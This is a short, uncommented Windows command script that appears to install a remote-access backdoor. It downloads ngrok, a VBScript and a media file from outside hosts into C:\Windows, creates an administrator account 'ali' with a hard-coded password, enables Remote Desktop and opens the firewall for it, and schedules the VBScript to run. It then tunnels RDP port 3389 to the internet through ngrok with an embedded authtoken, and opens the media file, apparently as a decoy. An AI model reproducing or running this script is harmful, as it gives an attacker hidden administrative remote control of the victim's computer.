curl.exe https://download941.mediafire.com/cf4n2zsh77agqaRBlmMW8_lUPGd7LvqEJYgbwt9vX3W1Ek9DU2j8LZktS4wXP-Tc-h9TCwugfET4vZNLVHCU56OXwAD17DV-1orcWpPdyO5PO9UJ5V1vq6pIEzkvBb_U-IGIdBx3GIjtHQBoR2SCPqQ92cSwanWmVbfp5jHKTAKw/hyoq3giaac6sa73/ngrok.exe -o C:\Windows\ngrok.exe
curl.exe https://raw.githubusercontent.com/terionun/gui/main/test.vbs -o C:\Windows\test.vbs
curl.exe https://github.com/terionun/gui/raw/main/mt2.mkv -o C:\Windows\mt2.mkv


net user ali ali123 /add
net localgroup administrators ali /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
schtasks /create /sc minute /mo 1000 /tn "MustafaTime" /tr "wscript C:\Windows\test.vbs"
C:\Windows\ngrok.exe config add-authtoken 1d0A6StSywuFgvJKSRCPurcS63o_2uL5cX6HAHfJz7rFzfJTq
C:\Windows\ngrok.exe tcp 3389
start C:\Windows\mt2.mkv


